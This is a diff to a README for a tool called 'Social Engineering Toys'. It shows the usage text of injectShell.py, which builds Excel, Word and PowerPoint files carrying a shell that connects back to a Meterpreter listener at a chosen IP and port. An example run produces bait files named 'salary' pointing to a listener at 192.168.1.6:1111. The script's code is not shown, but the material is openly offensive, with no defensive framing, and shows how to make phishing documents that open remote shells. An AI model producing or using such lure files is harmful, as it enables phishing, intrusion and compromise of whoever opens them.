@@ -2,12 +2,21 @@
 Social Engineering Toys  
   
 ```
-$ sudo python injectShell.py 
-usage: injectShell.py [-h] [-i I] [-o O] [-ip IP]
+$  python injectShell.py -h
+usage: injectShell.py [-h] [-t T] [-o O] [-ip IP] [-port PORT]
 
 optional arguments:
   -h, --help  show this help message and exit
-  -i I        [input microsoft excel/word filename]
-  -o O        [output filename]
-  -ip IP      [public ip address of meterpreter listener]
+  -t T        [xls|doc|ppt]
+  -o O        [output filename (without extension)]
+  -ip IP      [meterpreter listener ip address]
+  -port PORT  [meterpreter listener port]
+
 ```
+```
+$  python injectShell.py -t all -o salary -ip 192.168.1.6 -port 1111 
+- Generated: salary.xls
+- Generated: salary.doc
+- Generated: salary.ppt
+```
+
